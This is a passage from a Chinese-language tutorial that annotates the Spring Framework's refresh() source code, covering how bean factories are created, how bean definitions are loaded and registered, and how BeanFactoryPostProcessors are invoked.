creation.\n\t\t\tregisterBeanPostProcessors(beanFactory);\n \n\t\t\t// Initialize message source for this context.\n\t\t\tinitMessageSource();\n \n\t\t\t// Initialize event multicaster for this context.\n\t\t\tinitApplicationEventMulticaster();\n \n\t\t\t// Initialize other special beans in specific context subclasses.\n\t\t\tonRefresh();\n \n\t\t\t// Check for listener beans and register them.\n\t\t\tregisterListeners();\n \n\t\t\t// Instantiate all remaining (non-lazy-init) singletons.\n\t\t\tfinishBeanFactoryInitialization(beanFactory);\n \n\t\t\t// Last step: publish corresponding event.\n\t\t\tfinishRefresh();\n\t\t}\n \n\t\tcatch (BeansException ex) {\n\t\t\tif (logger.isWarnEnabled()) {\n\t\t\t\tlogger.warn("Exception encountered during context initialization - " +\n\t\t\t\t\t\t"cancelling refresh attempt: " + ex);\n\t\t\t}\n \n\t\t\t// Destroy already created singletons to avoid dangling resources.\n\t\t\tdestroyBeans();\n \n\t\t\t// Reset \'active\' flag.\n\t\t\tcancelRefresh(ex);\n \n\t\t\t// Propagate exception to caller.\n\t\t\tthrow ex;\n\t\t}\n \n\t\tfinally {\n\t\t\t// Reset common introspection caches in Spring\'s core, since we\n\t\t\t// might not ever need metadata for singleton beans anymore...\n\t\t\tresetCommonCaches();\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# 5.3 prepareRefresh()\n\n这个方法还是比较简单的，也就是做了一个时间戳，日志，环境校验，初始化监听器容器，初始化ApplicationEvents容器\n\nprotected void prepareRefresh() {\n\t// Switch to active.\n        //前面这些就是记录以下启动的时间\n\tthis.startupDate = System.currentTimeMillis();\n\tthis.closed.set(false);\n\tthis.active.set(true);\n\t\t//进行一些日志的设置\n\tif (logger.isDebugEnabled()) {\n\t\tif (logger.isTraceEnabled()) {\n            logger.trace("Refreshing " + this);\n        }\n        else {\n            logger.debug("Refreshing " + getDisplayName());\n        }\n\t}\n\t// Initialize any placeholder property sources in the context environment.\n\t\t//这是一个空的方法，目前spring没有对其做任何事\n\tinitPropertySources();\n \n\t// Validate that all properties marked as required are resolvable:\n\t// see ConfigurablePropertyResolver#setRequiredProperties\n            //验证配置文件的有效性\n            //Environment这个类主要用于当前环境的判断，判断有效性之类的\n            //getEnvironment这个方法的逻辑你可以试着点进去，发现就是\n            //有的话直接返回，没有的话就创建一个\n\tgetEnvironment().validateRequiredProperties();\n \n\t// Store pre-refresh ApplicationListeners...\n            //在最开始的图中我们也提到了监听器，这里就是监听器\n            //准备的时候创建一个监听器的容器\n\tif (this.earlyApplicationListeners == null) {\n\t\tthis.earlyApplicationListeners = new LinkedHashSet<>(this.applicationListeners);\n\t}\n\telse {\n\t\t// Reset local application listeners to pre-refresh state.\n\t\tthis.applicationListeners.clear();\n\t\tthis.applicationListeners.addAll(this.earlyApplicationListeners);\n\t}\n \n\t// Allow for the collection of early ApplicationEvents,\n\t// to be published once the multicaster is available...\n            //在multicaster设置之前发布的ApplicationEvents\n\tthis.earlyApplicationEvents = new LinkedHashSet<>();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 5.4 核心方法之一 obtainFreshBeanFactory()\n\n这个地方方法走的比较多，解释我基本都会写在注释当中\n\nprotected ConfigurableListableBeanFactory obtainFreshBeanFactory() {\n\t\t//一共有两步\n                //关闭旧的beanFactory 创建新的beanFactory 并注册\n                refreshBeanFactory();\n                //返回创造的对象\n                之后我们将具体来看一下这两个方法\n\t\treturn getBeanFactory();\n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n右键， refreshBeanFactory()，goto，来到相应的方法，这个方法在\n\nAbstractRefreshableApplicationContext类当中\n\nprotected final void refreshBeanFactory() throws BeansException {\n    //这一步很简单，如果有的话，就关闭之前的，重新创建\n    if (hasBeanFactory()) {\n        destroyBeans();\n        closeBeanFactory();\n    }\n    try {\n        //这一步又要详细分析这四个方法了\n        //这个方法里面就一句话\n        //new DefaultListableBeanFactory(getInternalParentBeanFactory());\n        //也就是创建一个beanFactory这个类，初步形成\n        DefaultListableBeanFactory beanFactory = createBeanFactory();\n\n        //设置序列化ID\n        beanFactory.setSerializationId(getId());\n        //这个地方有点意思，需要讲一下，在下面看一下它的方法\n        //customize是定制的意思，所以英文对程序员真的很有用\n        customizeBeanFactory(beanFactory);\n        //这是创建的时候最核心的方法，一层一层深入看一下吧\n        loadBeanDefinitions(beanFactory);\n        //设置到这个类的属性当中，用于返回对象方法时的使用\n        synchronized (this.beanFactoryMonitor) {\n            this.beanFactory = beanFactory;\n        }\n    }\n    catch (IOException ex) {\n        throw new ApplicationContextException("I/O error parsing bean definition source for " + getDisplayName(), ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\ncustomizeBeanFactory方法，定义覆盖以及循环依赖的问题\n\nprotected void customizeBeanFactory(DefaultListableBeanFactory beanFactory) {\n\n\tif (this.allowBeanDefinitionOverriding != null) {\n\t\t//是否允许bean定义的覆盖\n\t\t// BeanDefinition 的覆盖问题大家也许会碰到，\n\t\t// 就是在配置文件中定义 bean 时使用了相同的 id 或 name\n\t\t// ，默认情况下，allowBeanDefinitionOverriding 属性为 null，\n\t\t// 如果在同一配置文件中重复了，会抛错，但是如果不是同一配置文件中，会发生覆盖。\n\t\tbeanFactory.setAllowBeanDefinitionOverriding(this.allowBeanDefinitionOverriding);\n\t}\n\tif (this.allowCircularReferences != null) {\n\t\t//是否允许bean 间的循环依赖\n\t\t// A 依赖 B，而 B 依赖 A。或 A 依赖 B，B 依赖 C，而 C 依赖 A\n\t\t// 默认情况下，Spring 允许循环依赖，当然如果你在 A 的构造方法中依赖 B，在 B 的构造方法中依赖 A 是不行的。\n\t\tbeanFactory.setAllowCircularReferences(this.allowCircularReferences);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n核心方法：loadBeanDefinitions(beanFactory)，这里就和我们图中的beanDefinitionReader联系在一起了，有内味儿了\n\nprotected void loadBeanDefinitions(DefaultListableBeanFactory beanFactory) throws BeansException, IOException {\n\t// Create a new XmlBeanDefinitionReader for the given BeanFactory.\n\t// 创建同一个XmlBeanDefinitionReader 见名知意 xml的BeanDefine读取器转换器 也就是将xml文件转化为BeanDefinition\n\tXmlBeanDefinitionReader beanDefinitionReader = new XmlBeanDefinitionReader(beanFactory);\n\t// Configure the bean definition reader with this context\'s\n\t// resource loading environment.\n\t// 设置当前环境\n\tbeanDefinitionReader.setEnvironment(this.getEnvironment());\n\t//这里的setResourceLoader赋值 我们在refresh方法的时候就已经给this赋值\n\t//且看\n\t// \t\tsuper(parent);\n\t//\t\t// 将配置文件路径设置给AbstractRefreshableConfigApplicationContext 的        configLocations的属性\n\t//\t\tsetConfigLocations(configLocations); //这个方法就将配置路径赋值了\n\t//\t\t// 由上面的参数传进refresh为true 下面我们就进入refresh方法 spring初始化全程\n\t//\t\tif (refresh) {\n\t//\t\t\trefresh();\n\t//\t\t}\n\tbeanDefinitionReader.setResourceLoader(this);\n\tbeanDefinitionReader.setEntityResolver(new ResourceEntityResolver(this));\n\t// Allow a subclass to provide custom initialization of the reader,\n\t// then proceed with actually loading the bean definitions.\n\tinitBeanDefinitionReader(beanDefinitionReader);\n\t//下面方法是核心\n\tloadBeanDefinitions(beanDefinitionReader);\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n继续进入loadBeanDefinitions(beanDefinitionReader);方法\n\n点进reader.loadBeanDefinitions(configLocations);方法\n\n点进loadBeanDefinitions方法\n\n点进doLoadBeanDefinitions方法，在spring中带do的都是干实事的\n\n \nprotected int doLoadBeanDefinitions(InputSource inputSource, Resource resource)\n    throws BeanDefinitionStoreException {\n    try {\n        //这里我们将资源文件转化为Document对象\n        Document doc = doLoadDocument(inputSource, resource);\n        //开始注册对应的BeanDefinition 我们继续进去\n        int count = registerBeanDefinitions(doc, resource);\n        if (logger.isDebugEnabled()) {\n            logger.debug("Loaded " + count + " bean definitions from " + resource);\n        }\n        return count;\n    }\n    catch (BeanDefinitionStoreException ex) {\n        throw ex；\n    }\n    catch (SAXParseException ex) {\n        throw new XmlBeanDefinitionStoreException(resource.getDescription(),\n                                                  "Line " + ex.getLineNumber() + " in XML document from " + resource + " is invalid", ex);\n    }\n    catch (SAXException ex) {\n        throw new XmlBeanDefinitionStoreException(resource.getDescription(),\n                                                  "XML document from " + resource + " is invalid", ex);\n    }\n    catch (ParserConfigurationException ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                                               "Parser configuration exception parsing XML from " + resource, ex);\n    }\n    catch (IOException ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                                               "IOException parsing XML document from " + resource, ex);\n    }\n    catch (Throwable ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                                               "Unexpected exception parsing XML document from " + resource, ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n直接进入DefaultBeanDefinitionDocumentReader 下面的doRegisterBeanDefinitions\n\nprotected void doRegisterBeanDefinitions(Element root) {\n\t\t// Any nested <beans> elements will cause recursion in this method. In\n\t\t// rder to propagate and preserve <beans> default-* attributes correctly,\n\t\t// keep track of the current (parent) delegate, which may be null. Create\n\t\t// the new (child) delegate with a reference to the parent for fallback purposes,\n\t\t// then ultimately reset this.delegate back to its original (parent) reference.\n\t\t// this behavior emulates a stack of delegates without actually necessitating one.\n\t\tBeanDefinitionParserDelegate parent = this.delegate;\n\t\tthis.delegate = createDelegate(getReaderContext(), root, parent);\nif (this.delegate.isDefaultNamespace(root)) {\n\t\t\tString profileSpec = root.getAttribute(PROFILE_ATTRIBUTE);\n\t\t\tif (StringUtils.hasText(profileSpec)) {\n\t\t\t\tString[] specifiedProfiles = StringUtils.tokenizeToStringArray(\n\t\t\t\t\t\tprofileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);\n\t\t\t\t// We cannot use Profiles.of(...) since profile expressions are not supported\n\t\t\t\t// in XML config. See SPR-12458 for details.\n\t\t\t\tif (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) {\n\t\t\t\t\tif (logger.isDebugEnabled()) {\n\t\t\t\t\t\tlogger.debug("Skipped XML bean definition file due to specified profiles [" + profileSpec +\n\t\t\t\t\t\t\t\t"] not matching: " + getReaderContext().getResource());\n\t\t\t\t\t}\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tpreProcessXml(root);\n\t\t// 解析xml 将xml元素转化为BeanDefinition\n\t\tparseBeanDefinitions(root, this.delegate);\n\t\tpostProcessXml(root);\n\t\tthis.delegate = parent;\n \n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n根据上面的解释我们直接进入parseBeanDefinitions(root, this.delegate);\n\n再进入parseDefaultElement(ele, delegate)\n\nprivate void parseDefaultElement(Element ele, BeanDefinitionParserDelegate delegate) {\n\tif (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) {\n\t\t//处理import标签\n\t\timportBeanDefinitionResource(ele);\n\t}\n\telse if (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) {\n\t\t//处理alias标签\n\t\tprocessAliasRegistration(ele);\n\t}\n\telse if (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) {\n\t\t//处理bean标签\n\t\tprocessBeanDefinition(ele, delegate);\n\t}\n\telse if (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) {\n\t\t// 处理beans标签\n\t\tdoRegisterBeanDefinitions(ele);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n进入processBeanDefinition(ele, delegate);我们只关心bean\n\nprotected void processBeanDefinition(Element ele, BeanDefinitionParserDelegate delegate) {\n\t// xml节点信息转化为BeanDefinitionHolder对象\n\tBeanDefinitionHolder bdHolder = delegate.parseBeanDefinitionElement(ele);\n\tif (bdHolder != null) {\n\t\t//如果有自定义属性的话 进行相应的解析\n\t\tbdHolder = delegate.decorateBeanDefinitionIfRequired(ele, bdHolder);\n\t\ttry {\n\t\t\t// Register the final decorated instance.\n\t\t\t// 这一步就是注册bean啦\n\t\t\tBeanDefinitionReaderUtils.registerBeanDefinition(bdHolder, getReaderContext().getRegistry());\n\t\t}\n\t\tcatch (BeanDefinitionStoreException ex) {\n\t\t\tgetReaderContext().error("Failed to register bean definition with name \'" +\n\t\t\t\t\tbdHolder.getBeanName() + "\'", ele, ex);\n\t\t}\n\t\t// Send registration event.\n\t\tgetReaderContext().fireComponentRegistered(new BeanComponentDefinition(bdHolder));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n进入registerBeanDefinition方法\n\n\tpublic static void registerBeanDefinition(\n\t\t\tBeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry)\n\t\t\tthrows BeanDefinitionStoreException {\n \n\t\t// Register bean definition under primary name.\n\t\tString beanName = definitionHolder.getBeanName();\n\t\tregistry.registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());\n \n\t\t// Register aliases for bean name, if any.\n\t\tString[] aliases = definitionHolder.getAliases();\n\t\tif (aliases != null) {\n\t\t\tfor (String alias : aliases) {\n\t\t\t\tregistry.registerAlias(beanName, alias);\n\t\t\t}\n\t\t}\n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n再进入registry.registerBeanDefinition\n\npublic void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)\n\t\t\tthrows BeanDefinitionStoreException {\n\n    Assert.hasText(beanName, "Bean name must not be empty");\n    Assert.notNull(beanDefinition, "BeanDefinition must not be null");\n\n    if (beanDefinition instanceof AbstractBeanDefinition) {\n        try {\n            ((AbstractBeanDefinition) beanDefinition).validate();\n        }\n        catch (BeanDefinitionValidationException ex) {\n            throw new BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,\n                                                   "Validation of bean definition failed", ex);\n        }\n    }\n\n    BeanDefinition existingDefinition = this.beanDefinitionMap.get(beanName);\n    if (existingDefinition != null) {\n        if (!isAllowBeanDefinitionOverriding()) {\n            throw new BeanDefinitionOverrideException(beanName, beanDefinition, existingDefinition);\n        }\n        else if (existingDefinition.getRole() < beanDefinition.getRole()) {\n            // e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE\n            if (logger.isInfoEnabled()) {\n                logger.info("Overriding user-defined bean definition for bean \'" + beanName +\n                            "\' with a framework-generated bean definition: replacing [" +\n                            existingDefinition + "] with [" + beanDefinition + "]");\n            }\n        }\n        else if (!beanDefinition.equals(existingDefinition)) {\n            if (logger.isDebugEnabled()) {\n                logger.debug("Overriding bean definition for bean \'" + beanName +\n                             "\' with a different definition: replacing [" + existingDefinition +\n                             "] with [" + beanDefinition + "]");\n            }\n        }\n        else {\n            if (logger.isTraceEnabled()) {\n                logger.trace("Overriding bean definition for bean \'" + beanName +\n                             "\' with an equivalent definition: replacing [" + existingDefinition +\n                             "] with [" + beanDefinition + "]");\n            }\n        }\n        this.beanDefinitionMap.put(beanName, beanDefinition);\n    }\n    else {\n        if (hasBeanCreationStarted()) {\n            // Cannot modify startup-time collection elements anymore (for stable iteration)\n            synchronized (this.beanDefinitionMap) {\n                this.beanDefinitionMap.put(beanName, beanDefinition);\n                List<String> updatedDefinitions = new ArrayList<>(this.beanDefinitionNames.size() + 1);\n                updatedDefinitions.addAll(this.beanDefinitionNames);\n                updatedDefinitions.add(beanName);\n                this.beanDefinitionNames = updatedDefinitions;\n                removeManualSingletonName(beanName);\n            }\n        }\n        else {\n            // Still in startup registration phase\n            this.beanDefinitionMap.put(beanName, beanDefinition);\n            this.beanDefinitionNames.add(beanName);\n            removeManualSingletonName(beanName);\n        }\n        this.frozenBeanDefinitionNames = null;\n    }\n\n    if (existingDefinition != null || containsSingleton(beanName)) {\n        resetBeanDefinition(beanName);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n然后我们看看这个DefaultListableBeanFactory的关系图\n\n\n\n到此为止基本就创建完了，最后执行获取这个操作了。\n\n\tpublic final ConfigurableListableBeanFactory getBeanFactory() {\n \n            //因为在刚才的refreshBeanFactory()方法中，我们已经将beanFactory这个类设置到this当中了\n            //所以在这个地方直接获取\n\tsynchronized (this.beanFactoryMonitor) {\n\t\tif (this.beanFactory == null) {\n\t\t\tthrow new IllegalStateException("BeanFactory not initialized or already closed - " +\n\t\t\t\t\t"call \'refresh\' before accessing beans via the ApplicationContext");\n\t\t}\n\t\treturn this.beanFactory;\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 5.5 prepareBeanFactory()\n\nprotected void prepareBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n    //设置类加载器：存在则直接设置/不存在则新建一个默认类加载器\n    beanFactory.setBeanClassLoader(getClassLoader());\n    //设置EL表达式解析器（Bean初始化完成后填充属性时会用到）\n    beanFactory.setBeanExpressionResolver(new StandardBeanExpressionResolver(beanFactory.getBeanClassLoader()));\n    //设置属性注册解析器PropertyEditor\n    beanFactory.addPropertyEditorRegistrar(new ResourceEditorRegistrar(this, getEnvironment()));\n    // 将当前的ApplicationContext对象交给ApplicationContextAwareProcessor类来处理，从而在Aware接口实现类中的注入applicationContext\n    beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(this));\n    //设置忽略自动装配的接口\n    beanFactory.ignoreDependencyInterface(ResourceLoaderAware.class);\n    beanFactory.ignoreDependencyInterface(ApplicationEventPublisherAware.class);\n    beanFactory.ignoreDependencyInterface(MessageSourceAware.class);\n    beanFactory.ignoreDependencyInterface(ApplicationContextAware.class);\n    beanFactory.ignoreDependencyInterface(EnvironmentAware.class);\n    //注册可以解析的自动装配\n    // MessageSource registered (and found for autowiring) as a bean.\n    beanFactory.registerResolvableDependency(BeanFactory.class, beanFactory);\n    beanFactory.registerResolvableDependency(ResourceLoader.class, this);\n    beanFactory.registerResolvableDependency(ApplicationEventPublisher.class, this);\n    beanFactory.registerResolvableDependency(ApplicationContext.class, this);\n    //如果当前BeanFactory包含loadTimeWeaver Bean，说明存在类加载期织入AspectJ，则把当前BeanFactory交给类加载期BeanPostProcessor实现类LoadTimeWeaverAwareProcessor来处理，从而实现类加载期织入AspectJ的目的。\n    if (beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {\n        beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));\n        // Set a temporary ClassLoader for type matching.\n        beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));\n    }\n    //注册当前容器环境environment组件Bean\n    if (!beanFactory.containsLocalBean(ENVIRONMENT_BEAN_NAME)) {\n        beanFactory.registerSingleton(ENVIRONMENT_BEAN_NAME, getEnvironment());\n    }\n    //注册系统配置systemProperties组件Bean\n    if (!beanFactory.containsLocalBean(SYSTEM_PROPERTIES_BEAN_NAME)) {\n        beanFactory.registerSingleton(SYSTEM_PROPERTIES_BEAN_NAME, getEnvironment().getSystemProperties());\n    }\n    //注册系统环境systemEnvironment组件Bean\n    if (!beanFactory.containsLocalBean(SYSTEM_ENVIRONMENT_BEAN_NAME)) {\n        beanFactory.registerSingleton(SYSTEM_ENVIRONMENT_BEAN_NAME, getEnvironment().getSystemEnvironment());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 5.6 postProcessBeanFactory()\n\nspring中并没有具体去实现postProcessBeanFactory方法，作用是在BeanFactory准备工作完成后做一些定制化的处理。\n\n\n# 5.7 核心方法之一 invokeBeanFactoryPostProcessors()\n\nInstantiate and invoke all registered BeanFactoryPostProcessor beans,respecting explicit order if given.\n\n上面是对这个方法的描述，调用所有注册的BeanFactoryPostProcessor，并遵循显式顺序（如果给定的话）。\n\nBeanFactoryPostProcessor 接口是 Spring 初始化 BeanFactory 时对外暴露的扩展点，Spring IoC 容器允许 BeanFactoryPostProcessor 在容器实例化任何 bean 之前读取 bean 的定义，并可以修改它。\n\nprotected void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n            //getBeanFactoryPostProcessors(): 拿到当前应用上下文beanFactoryPostProcessors变量中的值\n            //invokeBeanFactoryPostProcessors: 实例化并调用所有已注册的BeanFactoryPostProcessor\n            PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());\n \n\t// Detect a LoadTimeWeaver and prepare for weaving, if found in the meantime\n\t// (e.g. through an @Bean method registered by ConfigurationClassPostProcessor)\n\tif (beanFactory.getTempClassLoader() == null && beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {\n\t\tbeanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));\n\t\tbeanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n这一段代码的核心在于获取和调用，下面进行详细的讲解 getBeanFactoryPostProcessors()，这个方法默认是没有的，返回null\n\npublic List<BeanFactoryPostProcessor> getBeanFactoryPostProcessors() {\n\treturn this.beanFactoryPostProcessors;\n}\n\n\n1\n2\n3\n\n\n如何添加自定义 BeanFactoryPostProcessor 到 this.beanFactoryPostProcessors 变量中了？\n\n新建一个 ApplicationContextInitializer 的实现类 SpringApplicationContextInitializer ，并在 initialize 方法中写我们的逻辑。\n\npackage com.joonwhee.open.demo.spring;\nimport org.springframework.context.ApplicationContextInitializer;\nimport org.springframework.context.ConfigurableApplicationContext;\n/**\n * @author joonwhee\n * @date 2019/1/19\n */\npublic class SpringApplicationContextInitializer implements ApplicationContextInitializer<ConfigurableApplicationContext> {\n    @Override\n    public void initialize(ConfigurableApplicationContext applicationContext) {\n        FirstBeanDefinitionRegistryPostProcessor firstBeanDefinitionRegistryPostProcessor = new FirstBeanDefinitionRegistryPostProcessor();\n        // 将自定义的firstBeanDefinitionRegistryPostProcessor添加到应用上下文中\n        applicationContext.addBeanFactoryPostProcessor(firstBeanDefinitionRegistryPostProcessor);\n        // ...自定义操作\n        System.out.println("SpringApplicationContextInitializer#initialize");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n将 SpringApplicationContextInitializer 作为初始化参数 contextInitializerClasses 配置到 web.xml 中。\n\n<context-param>\n    <param-name>contextInitializerClasses</param-name>\n    <param-value>\n        com.joonwhee.open.demo.spring.SpringApplicationContextInitializer\n    </param-value>\n</context-param>\n\n\n1\n2\n3\n4\n5\n6\n\n\ninvokeBeanFactoryPostProcessors方法\n\n \npublic static void invokeBeanFactoryPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, List<BeanFactoryPostProcessor> beanFactoryPostProcessors) {\n \n \n \n    // Invoke BeanDefinitionRegistryPostProcessors first, if any.\n \n    Set<String> processedBeans = new HashSet<String>();\n \n \n \n    // 1.判断beanFactory是否为BeanDefinitionRegistry，beanFactory为DefaultListableBeanFactory,\n \n    // 而DefaultListableBeanFactory实现了BeanDefinitionRegistry接口，因此这边为true\n \n    if (beanFactory instanceof BeanDefinitionRegistry) {\n \n        BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;\n \n        // 用于存放普通的BeanFactoryPostProcessor\n \n        List<BeanFactoryPostProcessor> regularPostProcessors = new LinkedList<BeanFactoryPostProcessor>();\n \n        // 用于存放BeanDefinitionRegistryPostProcessor\n \n        List<BeanDefinitionRegistryPostProcessor> registryProcessors = new LinkedList<BeanDefinitionRegistryPostProcessor>();\n \n \n \n        // 2.首先处理入参中的beanFactoryPostProcessors\n \n        // 遍历所有的beanFactoryPostProcessors, 将BeanDefinitionRegistryPostProcessor和普通BeanFactoryPostProcessor区分开\n \n        for (BeanFactoryPostProcessor postProcessor : beanFactoryPostProcessors) {\n \n            if (postProcessor instanceof BeanDefinitionRegistryPostProcessor) {\n \n                // 2.1 如果是BeanDefinitionRegistryPostProcessor\n \n                BeanDefinitionRegistryPostProcessor registryProcessor =\n \n                        (BeanDefinitionRegistryPostProcessor) postProcessor;\n \n                // 2.1.1 直接执行BeanDefinitionRegistryPostProcessor接口的postProcessBeanDefinitionRegistry方法\n \n                registryProcessor.postProcessBeanDefinitionRegistry(registry);\n \n                // 2.1.2 添加到registryProcessors(用于最后执行postProcessBeanFactory方法)\n \n                registryProcessors.add(registryProcessor);\n \n            } else {\n \n                // 2.2 否则，只是普通的BeanFactoryPostProcessor\n \n                // 2.2.1 添加到regularPostProcessors(用于最后执行postProcessBeanFactory方法)\n \n                regularPostProcessors.add(postProcessor);\n \n            }\n \n        }\n \n \n \n        // Do not initialize FactoryBeans here: We need to leave all regular beans\n \n        // uninitialized to let the bean factory post-processors apply to them!\n \n        // Separate between BeanDefinitionRegistryPostProcessors that implement\n \n        // PriorityOrdered, Ordered, and the rest.\n \n        // 用于保存本次要执行的BeanDefinitionRegistryPostProcessor\n \n        List<BeanDefinitionRegistryPostProcessor> currentRegistryProcessors = new ArrayList<BeanDefinitionRegistryPostProcessor>();\n \n \n \n        // First, invoke the BeanDefinitionRegistryPostProcessors that implement PriorityOrdered.\n \n        // 3.调用所有实现PriorityOrdered接口的BeanDefinitionRegistryPostProcessor实现类\n \n        // 3.1 找出所有实现BeanDefinitionRegistryPostProcessor接口的Bean的beanName\n \n        String[] postProcessorNames =\n \n                beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n \n        // 3.2 遍历postProcessorNames\n \n        for (String ppName : postProcessorNames) {\n \n            // 3.3 校验是否实现了PriorityOrdered接口\n \n            if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n \n                // 3.4 获取ppName对应的bean实例, 添加到currentRegistryProcessors中,\n \n                // beanFactory.getBean: 这边getBean方法会触发创建ppName对应的bean对象, 目前暂不深入解析\n \n                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n \n                // 3.5 将要被执行的加入processedBeans，避免后续重复执行\n \n                processedBeans.add(ppName);\n \n            }\n \n        }\n \n        // 3.6 进行排序(根据是否实现PriorityOrdered、Ordered接口和order值来排序)\n \n        sortPostProcessors(currentRegistryProcessors, beanFactory);\n \n        // 3.7 添加到registryProcessors(用于最后执行postProcessBeanFactory方法)\n \n        registryProcessors.addAll(currentRegistryProcessors);\n \n        // 3.8 遍历currentRegistryProcessors, 执行postProcessBeanDefinitionRegistry方法\n \n        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);\n \n        // 3.9 执行完毕后, 清空currentRegistryProcessors\n \n        currentRegistryProcessors.clear();\n \n \n \n        // Next, invoke the BeanDefinitionRegistryPostProcessors that implement Ordered.\n \n        // 4.调用所有实现了Ordered接口的BeanDefinitionRegistryPostProcessor实现类（过程跟上面的步骤3基本一样）\n \n        // 4.1 找出所有实现BeanDefinitionRegistryPostProcessor接口的类, 这边重复查找是因为执行完上面的BeanDefinitionRegistryPostProcessor,\n \n        // 可能会新增了其他的BeanDefinitionRegistryPostProcessor, 因此需要重新查找\n \n        postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n \n        for (String ppName : postProcessorNames) {\n \n            // 校验是否实现了Ordered接口，并且还未执行过\n \n            if (!processedBeans.contains(ppName) && beanFactory.isTypeMatch(ppName, Ordered.class)) {\n \n                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n \n                processedBeans.add(ppName);\n \n            }\n \n        }\n \n        sortPostProcessors(currentRegistryProcessors, beanFactory);\n \n        registryProcessors.addAll(currentRegistryProcessors);\n \n        // 4.2 遍历currentRegistryProcessors, 执行postProcessBeanDefinitionRegistry方法\n \n        